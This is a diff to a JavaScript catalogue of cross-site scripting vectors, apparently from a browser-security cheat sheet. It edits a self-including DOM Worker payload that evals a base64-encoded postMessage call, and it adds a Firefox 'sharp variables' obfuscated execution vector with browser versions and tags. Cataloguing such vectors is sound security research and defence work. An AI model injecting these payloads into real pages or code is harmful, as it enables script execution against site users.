@@ -51,7 +51,7 @@ var items =
         'id'         : 4, 
         'category'   : 'dom', 
         'name'       : 'Self-including DOM Worker XSS',
-        'data'       : '0?<script>Worker("#").onmessage=function(_)eval(_.data)</script>:postMessage(importScripts(\'data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk\'))',
+        'data'       : '0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts(\'data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk\'))',
         'description': 'A self-including code snippet utilizing a DOM worker and firing a message event to itself causing script execution',
         'tickets'    : [],
         'howtofix'   : '',            
@@ -237,5 +237,21 @@ var items =
         },
         'tags'       : ['dos', 'pattern', 'regex', 'html5', 'validation', 'opera'],
         'reporter'   : '.mario'
-    }
+    },
+    { /* ID 15 - JavaScript execution via sharp variables */
+        'id'         : 15,
+        'category'   : 'javascript', 
+        'name'       : 'JavaScript execution via sharp variables',
+        'data'       : '({0:#0=%js_alert_only%/#0#/#0#(0)})',
+        'description': 'This vector demonstrates how sharp variables and cyclic references can be used for obfuscation to hide the actual method execution.',
+        'tickets'    : [],
+        'howtofix'   : '',            
+        'browsers'   : {
+            'firefox': [
+                '2.x', '3.0', '3.5', '3.6', '3.7'
+            ]
+        },
+        'tags'       : ['xss', 'javascript', 'firefox', 'sharp'],
+        'reporter'   : '.mario'
+    },	
 ]
